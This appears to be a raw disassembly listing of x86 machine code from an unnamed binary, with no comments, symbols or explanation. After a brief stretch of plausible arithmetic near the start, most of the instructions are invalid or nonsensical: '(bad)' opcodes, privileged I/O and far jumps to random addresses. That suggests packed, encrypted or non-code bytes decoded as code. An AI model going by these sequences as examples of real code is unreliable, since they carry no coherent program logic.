  41d25a:	xor    ch,BYTE PTR [edi-0x20]
  41d25d:	fild   QWORD PTR [eax+0x11]
  41d260:	jge    0x41d2c9
  41d262:	sub    eax,0x393fa4a8
  41d267:	add    DWORD PTR [eax],esp
  41d269:	mov    eax,ds:0xa70398af
  41d26e:	mov    DWORD PTR [edi],esp
  41d270:	jbe    0x41d2a6
  41d272:	sub    ecx,DWORD PTR [ebx-0x2efc4fa3]
  41d278:	xor    edx,ebx
  41d27a:	mov    DWORD PTR [ebp-0x50],edx
  41d27d:	mov    edx,DWORD PTR [ebp+0x8]
  41d280:	mov    ebx,DWORD PTR [ebp-0x4c]
  41d283:	add    edx,edi
  41d285:	and    edx,ebx
  41d287:	mov    DWORD PTR [ebp-0x4c],edx
  41d28a:	mov    edx,DWORD PTR [ebp+0x8]
  41d28d:	mov    ebx,DWORD PTR [ebp-0x48]
  41d290:	lea    edx,[ebx+edx*1+0x241fc1f]
  41d297:	mov    DWORD PTR [ebp-0x48],edx
  41d29a:	mov    edx,DWORD PTR [ebp+0x8]
  41d29d:	mov    ebx,0xfa5e15e2
  41d2a2:	sub    ebx,edx
  41d2a4:	jmp    0x41f62d
  41d2a9:	xchg   esp,eax
  41d2aa:	pop    ebx
  41d2ab:	and    DWORD PTR [ebx],ebx
  41d2ad:	mov    eax,ds:0x93db941b
  41d2b2:	jo     0x41d32d
  41d2b4:	push   ebp
  41d2b5:	mov    bl,0xad
  41d2b7:	xchg   DWORD PTR [ecx-0xb],edx
  41d2ba:	std    
  41d2bb:	jns    0x41d337
  41d2bd:	push   es
  41d2be:	pop    edi
  41d2bf:	jp     0x41d33b
  41d2c1:	cmp    al,0x5f
  41d2c3:	fld    DWORD PTR [esp+edi*8+0x73]
  41d2c7:	fwait
  41d2c8:	dec    esp
  41d2c9:	fwait
  41d2ca:	cmp    dl,BYTE PTR [edi-0x78302c75]
  41d2d0:	hlt    
  41d2d1:	mov    ?,WORD PTR [edi+0x3e]
  41d2d4:	mov    esi,0x5c7de3c4
  41d2d9:	gs dec edi
  41d2db:	fcom   QWORD PTR [esi+0x6a52f6f3]
  41d2e1:	and    eax,0x7edc8f9
  41d2e6:	cli    
  41d2e7:	inc    edi
  41d2e8:	or     edi,ebx
  41d2ea:	cmp    eax,0xd1ec3eca
  41d2ef:	push   esp
  41d2f0:	mov    DWORD PTR [edx+ecx*2+0x44a61ef5],eax
  41d2f7:	ficomp WORD PTR [edi]
  41d2f9:	jb     0x41d2ce
  41d2fb:	or     eax,esp
  41d2fd:	sub    al,0x5e
  41d2ff:	cs mov eax,0x964b5cab
  41d305:	cmp    al,0x61
  41d307:	add    al,0x8c
  41d309:	dec    esi
  41d30a:	mov    bl,0xe0
  41d30c:	pop    eax
  41d30d:	(bad)  
  41d30e:	int    0x3d
  41d310:	aas    
  41d311:	jp     0x41d340
  41d313:	pop    ebx
  41d314:	adc    DWORD PTR [edi+0xc51fbfe],esp
  41d31a:	out    dx,eax
  41d31b:	push   edi
  41d31c:	dec    esp
  41d31d:	add    esp,ebp
  41d31f:	mov    gs,WORD PTR [ebp+0x6b7e4a6b]
  41d325:	loopne 0x41d325
  41d327:	sti    
  41d328:	pop    edx
  41d329:	add    eax,0xcaf8138f
  41d32e:	xor    eax,0xb68f6cea
  41d333:	aaa    
  41d334:	in     eax,0x4d
  41d336:	scas   eax,DWORD PTR es:[edi]
  41d337:	mov    dl,al
  41d339:	aam    0xac
  41d33b:	xchg   DWORD PTR [ebp+0xfab3acc],esp
  41d341:	mov    ecx,0x2d07ee86
  41d346:	enter  0x2db,0xda
  41d34a:	xchg   ecx,eax
  41d34b:	adc    BYTE PTR [esi-0x4a],ch
  41d34e:	push   edx
  41d34f:	or     al,bh
  41d351:	mov    DWORD PTR [ebx],ecx
  41d353:	rcl    BYTE PTR [ecx-0x44],0x6b
  41d357:	rcl    DWORD PTR [esi+0x7],1
  41d35a:	inc    esp
  41d35b:	jno    0x41d32d
  41d35d:	mov    esi,0x45305314
  41d362:	dec    ebx
  41d363:	jns    0x41d3d2
  41d365:	ds jg  0x41d338
  41d368:	sbb    eax,0x6fc22e11
  41d36d:	xor    eax,0x30c735e5
  41d372:	cmc    
  41d373:	mov    ds:0xeeb6eae4,al
  41d378:	aas    
  41d379:	hlt    
  41d37a:	hlt    
  41d37b:	cmp    eax,0xfcfcc8d1
  41d380:	mov    al,0x9f
  41d382:	(bad)  
  41d383:	inc    ebp
  41d384:	mov    eax,ds:0xcc75cd0d
  41d389:	shl    ah,1
  41d38b:	pop    ebx
  41d38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d38d:	call   0x73f8:0xcc40ef4c
  41d394:	enter  0xf5aa,0xc5
  41d398:	retf   0x15b4
  41d39b:	(bad)  
  41d39c:	inc    bp
  41d39e:	int    0xe5
  41d3a0:	ins    DWORD PTR es:[edi],dx
  41d3a1:	push   ss
  41d3a2:	pop    ecx
  41d3a3:	jo     0x41d41c
  41d3a5:	lods   al,BYTE PTR ds:[esi]
  41d3a6:	or     eax,0xbf1dbf91
  41d3ab:	xchg   esp,eax
  41d3ac:	out    0x26,al
  41d3ae:	add    DWORD PTR [ebp+0x2f],edx
  41d3b1:	and    al,0xcb
  41d3b3:	pushf  
  41d3b4:	popf   
  41d3b5:	jge    0x41d37e
  41d3b7:	mov    BYTE PTR [ebx-0x637bf17],0x4a
  41d3be:	ja     0x41d351
  41d3c0:	cmp    al,0x2
  41d3c2:	xchg   esi,eax
  41d3c3:	ret    0x7c7b
  41d3c6:	retf   0x6d59
  41d3c9:	mul    DWORD PTR [esi]
  41d3cb:	adc    DWORD PTR [ecx+0x626154fd],esp
  41d3d1:	mov    ah,dl
  41d3d3:	retf   
  41d3d4:	inc    esp
  41d3d5:	(bad)  
  41d3d6:	(bad)  
  41d3d7:	jnp    0x41d416
  41d3d9:	es mov dl,0x2a
  41d3dc:	or     ebx,ebx
  41d3de:	aaa    
  41d3df:	mov    al,ds:0xdfd36aec
  41d3e4:	inc    esi
  41d3e5:	mov    edx,0x7a557cc5
  41d3ea:	outs   dx,BYTE PTR ds:[esi]
  41d3eb:	jmp    0xa60c8170
  41d3f0:	cld    
  41d3f1:	inc    edx
  41d3f2:	xchg   edi,eax
  41d3f3:	test   BYTE PTR [ebp+ebp*4+0x6dd6b6c8],al
  41d3fa:	fisubr WORD PTR ds:0xa40aec44
  41d400:	cmp    eax,eax
  41d402:	sub    al,0x93
  41d404:	sub    ebx,edx
  41d406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d407:	jge    0x41d400
  41d409:	shr    esp,cl
  41d40b:	jbe    0x41d451
  41d40d:	sbb    esp,DWORD PTR [edx]
  41d40f:	inc    ebx
  41d410:	and    eax,0x21d25408
  41d415:	mov    ch,0x44
  41d417:	cmp    eax,0x43670fcd
  41d41c:	push   ss
  41d41d:	stos   DWORD PTR es:[edi],eax
  41d41e:	out    dx,eax
  41d41f:	loopne 0x41d40e
  41d421:	int    0x66
  41d423:	mov    ds:0x20a17a2c,al
  41d428:	lods   eax,DWORD PTR ds:[esi]
  41d429:	mov    ah,0x95
  41d42b:	retf   
  41d42c:	ror    ah,0x70
  41d42f:	arpl   sp,si
  41d431:	cmp    bh,BYTE PTR [ebx+0x6ca30add]
  41d437:	and    bl,al
  41d439:	mov    bh,0x71
  41d43b:	add    eax,0x6ebd76a1
  41d440:	pop    esp
  41d441:	sti    
  41d442:	or     ch,bh
  41d444:	out    dx,al
  41d445:	test   al,0xc7
  41d447:	dec    eax
  41d448:	div    DWORD PTR [eax]
  41d44a:	mov    ecx,0x95bfa027
  41d44f:	stos   BYTE PTR es:[edi],al
  41d450:	push   ebp
  41d451:	leave  
  41d452:	mov    esi,0x4381b50a
  41d457:	in     al,dx
  41d458:	push   es
  41d459:	fld    st(5)
  41d45b:	sbb    BYTE PTR [edi],dl
  41d45d:	data16 arpl WORD PTR [edi],bx
  41d460:	inc    eax
  41d461:	aas    
  41d462:	pop    ds
  41d463:	rcl    cl,cl
  41d465:	dec    eax
  41d466:	push   ebx
  41d467:	mov    bh,0xc6
  41d469:	fsubr  st(2),st
  41d46b:	xchg   ecx,eax
  41d46c:	aas    
  41d46d:	ffree  st(3)
  41d46f:	test   ebx,edx
  41d471:	or     DWORD PTR [edx+eiz*4-0x5d],ecx
  41d475:	jmp    0xfcc09427
  41d47a:	jns    0x41d417
  41d47c:	fsub   QWORD PTR [ebx+0x1fd0a8bb]
  41d482:	dec    ebx
  41d483:	popa   
  41d484:	out    0xe6,eax
  41d486:	jmp    0xfb8a2e88
  41d48b:	pop    edx
  41d48c:	add    eax,0x9abbdfcf
  41d491:	(bad)  
  41d492:	or     edx,esp
  41d494:	mov    ecx,0xea6a8784
  41d499:	lods   eax,DWORD PTR ds:[esi]
  41d49a:	adc    DWORD PTR [eax],eax
  41d49c:	aaa    
  41d49d:	dec    ebx
  41d49e:	clc    
  41d49f:	jae    0x41d4ff
  41d4a1:	daa    
  41d4a2:	in     eax,dx
  41d4a3:	add    al,0xc2
  41d4a5:	(bad)
  41d4a8:	mov    edx,0xa66c7f70
  41d4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4ae:	jge    0x41d4d6
  41d4b0:	pop    ecx
  41d4b1:	mov    eax,DWORD PTR [edx-0xd]
  41d4b4:	or     ah,BYTE PTR [edx+0x54]
  41d4b7:	xchg   DWORD PTR [eax-0x5a],edi
  41d4ba:	adc    al,0xc4
  41d4bc:	int3   
  41d4bd:	mov    al,0x85
  41d4bf:	mov    ebp,0x51a38bd1
  41d4c4:	sub    ch,al
  41d4c6:	pop    eax
  41d4c7:	mov    bh,BYTE PTR [eax+0x58]
  41d4ca:	xor    al,BYTE PTR [ecx+0x2c]
  41d4cd:	fwait
  41d4ce:	je     0x41d4df
  41d4d0:	(bad)  
  41d4d2:	or     al,0x39
  41d4d4:	xor    ebp,ebp
  41d4d6:	mov    esi,0x8f7e1aa9
  41d4db:	cmc    
  41d4dc:	shr    DWORD PTR [edx+0x1d9dd164],cl
  41d4e2:	(bad)  
  41d4e3:	dec    esi
  41d4e4:	(bad)  
  41d4e5:	rcr    BYTE PTR [ecx+0x62032a59],0x94
  41d4ec:	cs push edx
  41d4ee:	mov    cl,0x75
  41d4f0:	xor    esp,edx
  41d4f2:	stos   BYTE PTR es:[edi],al
  41d4f3:	inc    BYTE PTR [ecx-0x36]
  41d4f6:	clc    
  41d4f7:	call   0xfa87:0xbbb861d1
  41d4fe:	daa    
  41d4ff:	pop    edi
  41d500:	inc    edi
  41d501:	sub    ch,cl
  41d503:	sar    edi,0x62
  41d506:	icebp  
  41d507:	loopne 0x41d52d
  41d509:	pop    ebp
  41d50a:	stos   BYTE PTR es:[edi],al
  41d50b:	adc    eax,0xcc1cdde5
  41d510:	fstp   TBYTE PTR [eax-0x72ad24c1]
  41d516:	lock js 0x41d4c4
  41d519:	aaa    
  41d51a:	mov    DWORD PTR [edi+0x44],0x1e10fe81
  41d521:	bound  ebp,QWORD PTR [esi-0x1bea0297]
  41d527:	jg     0x41d527
  41d529:	mov    ebx,0xb82df080
  41d52e:	int    0x6d
  41d530:	or     dl,dl
  41d532:	mov    dl,0xf4
  41d534:	outs   dx,BYTE PTR ds:[esi]
  41d535:	ins    BYTE PTR es:[edi],dx
  41d536:	xchg   ebx,eax
  41d537:	fwait
  41d538:	push   es
  41d539:	das    
  41d53a:	stc    
  41d53b:	fnstsw WORD PTR [eax-0x23]
  41d53e:	mov    BYTE PTR [ebx],ch
  41d540:	push   cs
  41d541:	cli    
  41d542:	ins    DWORD PTR es:[edi],dx
  41d543:	mov    ah,0x10
  41d545:	inc    eax
  41d546:	pop    ds
  41d547:	mov    eax,ds:0x42afb7de
  41d54c:	and    esi,DWORD PTR [eax*1+0x55f493fb]
  41d553:	jge    0x41d573
  41d555:	inc    ebx
  41d556:	mov    al,0x54
  41d558:	pop    ds
  41d559:	(bad)  
  41d55a:	(bad)  
  41d55b:	in     al,dx
  41d55c:	xor    DWORD PTR [ecx],esp
  41d55e:	dec    ecx
  41d55f:	imul   edx,DWORD PTR ds:0xe8b467b7,0x5cc67afe
  41d569:	dec    ebx
  41d56a:	retf   0x8a37
  41d56d:	cmp    dl,BYTE PTR [eax-0x1]
  41d570:	stc    
  41d571:	ins    BYTE PTR es:[edi],dx
  41d572:	cmp    BYTE PTR [ebx],dh
  41d574:	xchg   ecx,eax
  41d575:	jmp    0xc828c7cd
  41d57a:	xor    esi,eax
  41d57c:	push   ds
  41d57d:	fwait
  41d57e:	add    al,0x50
  41d580:	jmp    0x41d5aa
  41d582:	dec    ebx
  41d583:	push   ss
  41d584:	lods   eax,DWORD PTR ds:[esi]
  41d585:	ret    
  41d586:	cli    
  41d587:	inc    esp
  41d588:	xor    edi,DWORD PTR [eax]
  41d58a:	rol    BYTE PTR [esi],0xbc
  41d58d:	xlat   BYTE PTR ds:[ebx]
  41d58e:	les    esp,FWORD PTR [esi+0x633bbddb]
  41d594:	and    edx,ebp
  41d596:	push   esp
  41d597:	retf   0x9baa
  41d59a:	popf   
  41d59b:	imul   edi,DWORD PTR [edx+edx*2+0x1695025f],0xffffffb2
  41d5a3:	out    0x84,eax
  41d5a5:	pop    es
  41d5a6:	jecxz  0x41d5e0
  41d5a8:	push   ss
  41d5a9:	test   eax,0x8145583f
  41d5ae:	mov    bl,0x52
  41d5b0:	stc    
  41d5b1:	xor    edx,edx
  41d5b3:	ds stc 
  41d5b5:	jae    0x41d5b3
  41d5b7:	popa   
  41d5b8:	dec    ebx
  41d5b9:	mov    ah,0x2a
  41d5bb:	push   ebx
  41d5bc:	repz mov bh,0xa2
  41d5bf:	cmp    eax,0xa41de954
  41d5c4:	mov    bl,0x9f
  41d5c6:	sub    eax,0x83280642
  41d5cb:	lea    eax,[esi-0x5afc1176]
  41d5d1:	pop    esp
  41d5d2:	xor    edi,DWORD PTR [ebx]
  41d5d4:	hlt    
  41d5d5:	les    esi,FWORD PTR [edx-0xd]
  41d5d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5d9:	test   BYTE PTR [ecx+0x3b],dl
  41d5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5dd:	push   cs
  41d5de:	xchg   edi,eax
  41d5df:	out    0x8d,eax
  41d5e1:	and    al,0xa9
  41d5e3:	stos   DWORD PTR es:[edi],eax
  41d5e4:	cld    
  41d5e5:	rcr    ebp,0xc7
  41d5e8:	mov    esp,0x919c2b57
  41d5ed:	pop    edx
  41d5ee:	mov    gs,WORD PTR ds:0xf2259c09
  41d5f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5f5:	sbb    BYTE PTR [eax-0x58],ch
  41d5f8:	dec    esi
  41d5f9:	lods   al,BYTE PTR ds:[esi]
  41d5fa:	out    0xf3,eax
  41d5fc:	mov    ebx,0xb11f0161
  41d601:	fxch   st(2)
  41d603:	daa    
  41d604:	push   edx
  41d605:	and    esi,DWORD PTR [edi]
  41d607:	pusha  
  41d608:	mov    edi,0x5444f74f
  41d60d:	into   
  41d60e:	sbb    eax,DWORD PTR [edi+ebp*1+0x73f9530e]
  41d615:	mov    dl,0x21
  41d617:	mov    al,ds:0x37b14b98
  41d61c:	dec    eax
  41d61d:	arpl   WORD PTR [edi-0x4a],cx
  41d620:	mov    cl,BYTE PTR [ebx]
  41d622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d623:	add    BYTE PTR ds:0x66e5e08,ah
  41d629:	rol    bh,0x84
  41d62c:	sbb    esi,ecx
  41d62e:	retf   0x6148
  41d631:	pop    ebx
  41d632:	clc    
  41d633:	pusha  
  41d634:	mov    DWORD PTR [ebp-0x1955cafc],0x3ff03ed2
  41d63e:	icebp  
  41d63f:	jo     0x41d6bf
  41d641:	jmp    0x41d683
  41d643:	jnp    0x41d62c
  41d645:	test   al,0x3a
  41d647:	or     DWORD PTR [edi-0x25],0xa8aa4731
  41d64e:	xor    al,0x33
  41d650:	ins    BYTE PTR es:[edi],dx
  41d651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d652:	mov    ds:0x8448299b,al
  41d657:	cmc    
  41d658:	xor    dh,0x3a
  41d65b:	scas   al,BYTE PTR es:[edi]
  41d65c:	xlat   BYTE PTR ds:[ebx]
  41d65d:	inc    esp
  41d65e:	xchg   ebp,eax
  41d65f:	nop
  41d660:	cmp    edx,ebx
  41d662:	xor    bh,BYTE PTR [eax+0x3b841186]
  41d668:	push   ecx
  41d669:	cmp    BYTE PTR [esi+0x35],0x44
  41d66d:	push   edx
  41d66e:	dec    eax
  41d66f:	push   0x7
  41d671:	in     al,dx
  41d672:	outs   dx,BYTE PTR ds:[esi]
  41d673:	imul   edi,esi,0x63b4e920
  41d679:	xchg   DWORD PTR [eax+0x17],ebx
  41d67c:	mov    ch,0x4a
  41d67e:	(bad)  [ebx+eax*2-0x43]
  41d682:	inc    esi
  41d683:	xchg   edi,eax
  41d684:	leave  
  41d685:	retf   
  41d686:	lds    edx,FWORD PTR [eax]
  41d688:	pop    ss
  41d689:	in     al,0x5c
  41d68b:	fsubr  st(7),st
  41d68d:	xlat   BYTE PTR ds:[ebx]
  41d68e:	mov    eax,0xc7f2beb7
  41d693:	and    esp,DWORD PTR [edi+0x53]
  41d696:	in     al,dx
  41d697:	pop    es
  41d698:	mov    edx,0xab4aa222
  41d69d:	jecxz  0x41d66a
  41d69f:	xchg   ebp,eax
  41d6a0:	hlt    
  41d6a1:	mov    dl,0xb8
  41d6a3:	sbb    edx,ebp
  41d6a5:	aas    
  41d6a6:	xor    ah,dh
  41d6a8:	lods   al,BYTE PTR ds:[esi]
  41d6a9:	stos   DWORD PTR es:[edi],eax
  41d6aa:	aas    
  41d6ab:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41d6ad:	(bad)  
  41d6af:	retf   
  41d6b0:	arpl   si,sp
  41d6b2:	cmp    si,WORD PTR [edi]
  41d6b5:	(bad)  
  41d6b6:	pop    edx
  41d6b7:	push   es
  41d6b8:	jnp    0x41d688
  41d6ba:	or     ecx,DWORD PTR [edx]
  41d6bc:	sahf   
  41d6bd:	xor    esp,DWORD PTR [ecx+0x5b334a87]
  41d6c3:	sbb    al,0x68
  41d6c5:	and    bh,BYTE PTR [ebx]
  41d6c7:	mov    edx,DWORD PTR [ebx+0xf]
  41d6ca:	retf   
  41d6cb:	pop    es
  41d6cc:	repz in al,dx
  41d6ce:	add    bl,BYTE PTR [ebx+eiz*8]
  41d6d1:	jle    0x41d6c1
  41d6d3:	mov    gs,WORD PTR [esi-0x22]
  41d6d6:	mov    edi,0x35170016
  41d6db:	in     eax,dx
  41d6dc:	out    dx,eax
  41d6dd:	cmp    ah,dl
  41d6df:	std    
  41d6e0:	sbb    eax,0x978329
  41d6e5:	into   
  41d6e6:	adc    al,0xec
  41d6e8:	hlt    
  41d6e9:	mov    BYTE PTR [ebx-0x4b54cf3c],bl
  41d6ef:	sti    
  41d6f0:	pop    ebp
  41d6f1:	imul   eax,DWORD PTR [ecx+0x79d39218],0xe1f55e5f
  41d6fb:	jo     0x41d68b
  41d6fd:	dec    eax
  41d6fe:	rcr    DWORD PTR [edi+eax*1+0x50],0x12
  41d703:	inc    edi
  41d704:	or     BYTE PTR [ecx+esi*2-0x1e0bae2],dh
  41d70b:	mov    dh,0x50
  41d70d:	leave  
  41d70e:	push   edi
  41d70f:	mov    al,0xf
  41d711:	cmp    al,0x10
  41d713:	and    edi,DWORD PTR [ecx+eax*8+0x4b]
  41d717:	scas   al,BYTE PTR es:[edi]
  41d718:	mov    ah,0x50
  41d71a:	int    0x72
  41d71c:	dec    esp
  41d71d:	add    al,0xd3
  41d71f:	retf   0xb2b
  41d722:	in     al,dx
  41d723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d724:	mov    ecx,0xb4bd0d1f
  41d729:	repz mov edi,0xc8d63f93
  41d72f:	jg     0x41d6b3
  41d731:	jp     0x41d74e
  41d733:	loope  0x41d76d
  41d735:	adc    DWORD PTR [edi],esp
  41d737:	mov    ebx,DWORD PTR [eax]
  41d739:	adc    dl,0x2
  41d73c:	jge    0x41d701
  41d73e:	leave  
  41d73f:	and    BYTE PTR [ecx],ch
  41d741:	in     eax,0x62
  41d743:	push   0xfb7c38b
  41d748:	mov    BYTE PTR [esi-0x7a],bl
  41d74b:	xor    edi,eax
  41d74d:	jbe    0x41d748
  41d74f:	scas   al,BYTE PTR es:[edi]
  41d750:	stc    
  41d751:	inc    esi
  41d752:	ins    BYTE PTR es:[edi],dx
  41d753:	mov    esi,0xf9ea9723
  41d758:	mov    eax,0x827a9cf3
  41d75d:	adc    eax,0x63e7577
  41d762:	ins    BYTE PTR es:[edi],dx
  41d763:	add    eax,0x7c007d17
  41d768:	adc    eax,0xcb84d60c
  41d76d:	and    al,0x29
  41d76f:	or     eax,DWORD PTR [ecx-0x3c1286e2]
  41d775:	loope  0x41d747
  41d777:	inc    eax
  41d778:	mov    dh,BYTE PTR [ebx+0x18a7f936]
  41d77e:	scas   eax,DWORD PTR es:[edi]
  41d77f:	ins    BYTE PTR es:[edi],dx
  41d780:	sub    BYTE PTR [eax],dl
  41d782:	mov    dl,BYTE PTR [ebp+0x6]
  41d785:	out    0xd0,al
  41d787:	xchg   edi,eax
  41d788:	sbb    eax,0x28c42734
  41d78d:	push   edi
  41d78e:	adc    al,BYTE PTR [edx]
  41d790:	aaa    
  41d791:	push   ds
  41d792:	imul   esp,edi,0x5a258e46
  41d798:	pop    ss
  41d799:	xor    cl,BYTE PTR [ebp+0x54]
  41d79c:	sub    ebp,ebp
  41d79e:	lods   eax,DWORD PTR ds:[esi]
  41d79f:	inc    ebp
  41d7a0:	and    bl,BYTE PTR [edx-0x20]
  41d7a3:	je     0x87eeb977
  41d7a9:	push   eax
  41d7aa:	shl    esp,0xf7
  41d7ad:	in     al,dx
  41d7ae:	inc    edi
  41d7af:	sti    
  41d7b0:	jmp    0x2377:0xe670f34c
  41d7b7:	xor    dh,BYTE PTR [ebx-0x55]
  41d7ba:	mov    bh,0x43
  41d7bc:	and    eax,0x4fbc8276
  41d7c1:	gs call 0x577c:0x3dc50b46
  41d7c9:	aaa    
  41d7ca:	add    eax,0x81d11fba
  41d7cf:	inc    esi
  41d7d0:	les    esp,FWORD PTR ds:0x1e3814dc
  41d7d6:	push   ebx
  41d7d7:	push   ds
  41d7d8:	xchg   ecx,eax
  41d7d9:	dec    esi
  41d7da:	(bad)  
  41d7db:	cdq    
  41d7dc:	adc    DWORD PTR [eax],eax
  41d7de:	add    BYTE PTR [eax],0xea
  41d7e1:	lds    esp,FWORD PTR [edx+0x68]
  41d7e4:	dec    edx
  41d7e5:	mov    bh,0xa7
  41d7e7:	add    al,0x65
  41d7e9:	les    edi,FWORD PTR [edi+0x4af947dc]
  41d7ef:	aad    0x8f
  41d7f1:	mov    eax,0x8eef043a
  41d7f6:	pop    es
  41d7f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7f8:	fcmovb st,st(1)
  41d7fa:	iret   
  41d7fb:	add    edi,DWORD PTR [edi]
  41d7fd:	adc    BYTE PTR [edx],al
  41d7ff:	push   esp
  41d800:	add    dh,BYTE PTR [esi]
  41d802:	inc    esi
  41d803:	into   
  41d804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d805:	(bad)  
  41d806:	add    al,ah
  41d808:	fidivr DWORD PTR [ecx-0x47]
  41d80b:	inc    edx
  41d80c:	mov    edi,0xc57ebaba
  41d811:	push   cs
  41d812:	cmp    eax,0x46875fa8
  41d817:	jb     0x41d883
  41d819:	sub    BYTE PTR ds:0xa778bf24,cl
  41d81f:	lea    esp,[ecx-0xac45daf]
  41d825:	(bad)  
  41d826:	fdivr  QWORD PTR [esi-0x4e70259b]
  41d82c:	fucomi st,st(0)
  41d82e:	adc    bl,BYTE PTR [edi]
  41d830:	ja     0x41d8a1
  41d832:	mov    esp,0x6629ced5
  41d837:	mov    esp,0x25140d70
  41d83c:	or     BYTE PTR [esi-0x31],bl
  41d83f:	inc    esi
  41d840:	arpl   WORD PTR [ebx],si
  41d842:	je     0x41d824
  41d844:	push   0x25
  41d846:	xchg   ebx,eax
  41d847:	pop    esp
  41d848:	sub    BYTE PTR [eax+eiz*1-0x4b],al
  41d84c:	cmp    BYTE PTR [esi+0x4fcfae9],dh
  41d852:	neg    DWORD PTR [edi+0x31]
  41d855:	(bad)  
  41d856:	pop    esp
  41d857:	dec    esp
  41d858:	stos   DWORD PTR es:[edi],eax
  41d859:	inc    edx
  41d85a:	pop    ss
  41d85b:	nop
  41d85c:	pop    ss
  41d85d:	loope  0x41d81e
  41d85f:	dec    ebx
  41d860:	(bad)  
  41d861:	retf   
  41d862:	ja     0x41d863
  41d864:	sub    BYTE PTR [ebp-0x68fcd7a7],0x99
  41d86b:	jp     0x41d864
  41d86d:	dec    eax
  41d86e:	push   ss
  41d86f:	cmp    DWORD PTR [edi+0x7b5cbe7f],edx
  41d875:	sub    eax,ebp
  41d877:	or     cl,bh
  41d879:	and    edi,DWORD PTR [eax-0x40572418]
  41d87f:	repz mov al,ds:0xb7d5ad44
  41d885:	adc    BYTE PTR [ebp-0x72],ch
  41d888:	or     eax,0xaafa8325
  41d88d:	pop    edi
  41d88e:	xor    eax,0x3924f6e2
  41d893:	sub    eax,0xd294d3f4
  41d898:	fstp   st(0)
  41d89a:	and    ebx,0xdaaec505
  41d8a0:	mov    edi,0x3c839bfb
  41d8a5:	sbb    eax,0xa17eea2e
  41d8aa:	xchg   edi,eax
  41d8ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ac:	adc    ebp,edi
  41d8ae:	test   DWORD PTR [ecx+0xc0fefee],esi
  41d8b4:	arpl   di,ax
  41d8b6:	jle    0x41d8da
  41d8b8:	dec    ebp
  41d8b9:	add    eax,0x15c134e
  41d8be:	out    0x6d,eax
  41d8c0:	add    edi,DWORD PTR [edx+0x6ff0f762]
  41d8c6:	jp     0x41d91b
  41d8c8:	imul   edi,DWORD PTR [eax+0x413088b1],0xffffffbc
  41d8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8d0:	xchg   esi,eax
  41d8d1:	jo     0x41d8a3
  41d8d3:	(bad)
  41d8d6:	adc    DWORD PTR [edi-0xee37fb2],ebx
  41d8dc:	call   0xaff62dbd
  41d8e1:	ret    0x6dbd
  41d8e4:	popa   
  41d8e5:	dec    esp
  41d8e6:	inc    ecx
  41d8e7:	fs xor eax,0x1454383d
  41d8ed:	inc    eax
  41d8ee:	mov    cl,0x7a
  41d8f0:	shr    DWORD PTR [ebp-0x5],1
  41d8f3:	push   ss
  41d8f4:	adc    BYTE PTR [edi+ebx*4-0x7cd2ee5],0x35
  41d8fc:	adc    DWORD PTR [edi],eax
  41d8fe:	(bad)  
  41d8ff:	fcom   QWORD PTR [ebx+0x3281585d]
  41d905:	sbb    al,0x65
  41d907:	fstp   DWORD PTR [edi]
  41d909:	cwde   
  41d90a:	retf   
  41d90b:	fsub   QWORD PTR [edx-0x70e754a8]
  41d911:	cmp    dh,BYTE PTR ds:0x8f97f31f
  41d917:	outs   dx,DWORD PTR ds:[esi]
  41d918:	mov    fs,WORD PTR [edi]
  41d91a:	mov    ebp,ds
  41d91c:	mov    dh,0x8b
  41d91e:	mov    WORD PTR [ecx-0x71990ce3],es
  41d924:	ret    0x9e17
  41d927:	push   edi
  41d928:	dec    edi
  41d929:	push   ds
  41d92a:	leave  
  41d92b:	outs   dx,BYTE PTR ds:[esi]
  41d92c:	xchg   edx,eax
  41d92d:	icebp  
  41d92e:	mov    ds:0x92ddeaa3,eax
  41d933:	(bad)  
  41d934:	pop    eax
  41d935:	sbb    eax,DWORD PTR [edi-0x69]
  41d938:	adc    al,0xa8
  41d93a:	jl     0x41d927
  41d93c:	push   DWORD PTR [ebp*1+0x22f7f4fe]
  41d943:	sbb    bl,BYTE PTR [ebp+0x19]
  41d946:	sbb    eax,DWORD PTR [edi-0x67]
  41d949:	xor    DWORD PTR [ecx-0x7caacf46],edi
  41d94f:	sbb    al,0x23
  41d951:	test   BYTE PTR [ecx],dh
  41d953:	cld    
  41d954:	adc    eax,esp
  41d956:	mov    al,ds:0xcdf370ea
  41d95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d95c:	xchg   edi,eax
  41d95d:	retf   
  41d95e:	lods   eax,DWORD PTR ds:[esi]
  41d95f:	and    al,0x90
  41d961:	mov    dh,0xc1
  41d963:	dec    esi
  41d964:	pop    edx
  41d965:	ins    BYTE PTR es:[edi],dx
  41d966:	pop    eax
  41d967:	test   BYTE PTR [ebx+0x1dd55946],bh
  41d96d:	sysexit 
  41d96f:	addr16 dec edi
  41d971:	jmp    0x41d95c
  41d973:	sar    BYTE PTR [eax+0x1f],1
  41d976:	push   ebx
  41d977:	xor    eax,0xaabdfb16
  41d97c:	jne    0x41d9d5
  41d97e:	dec    esi
  41d97f:	sbb    ecx,esi
  41d981:	test   eax,0x677c8a1e
  41d986:	fistp  WORD PTR fs:[edi+eiz*2+0x1378f704]
  41d98e:	cli    
  41d98f:	test   BYTE PTR [edx-0x21],0x19
  41d993:	(bad)  
  41d994:	mov    esp,0x301067ac
  41d999:	bound  esp,QWORD PTR [esp+ebp*4-0x3f220394]
  41d9a0:	scas   eax,DWORD PTR es:[edi]
  41d9a1:	std    
  41d9a2:	mov    esi,ds
  41d9a4:	pusha  
  41d9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9a6:	push   ss
  41d9a7:	cs xor al,0x79
  41d9aa:	mov    ah,0xa8
  41d9ac:	lea    ebp,[ecx]
